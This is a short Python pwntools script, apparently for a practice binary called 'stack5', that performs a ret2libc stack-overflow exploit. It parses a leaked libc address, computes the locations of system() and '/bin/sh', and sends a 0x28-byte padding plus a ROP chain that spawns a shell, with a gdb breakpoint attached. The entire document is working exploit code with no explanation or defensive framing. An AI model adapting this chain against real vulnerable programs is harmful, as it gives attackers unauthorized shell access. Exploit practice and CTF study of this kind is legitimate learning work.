from pwn import *

io = process('./stack5')


io.recvuntil(b'ft: ')

libc_addr = int(io.recvline().strip(), 16)
print(hex(libc_addr))
libc  = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc.address  = libc_addr - 0x3c5620
print("libc base", hex(libc.address))
system_addr = libc.symbols['system']
binsh_addr = libc.search("/bin/sh\0").next()

PrdiR = 0x400773
gdb.attach(io, "b print_name")

io.sendline(
    'a'*0x28 + 
    p64(PrdiR) + 
    p64(binsh_addr) +
    p64(system_addr)
)
io.interactive()
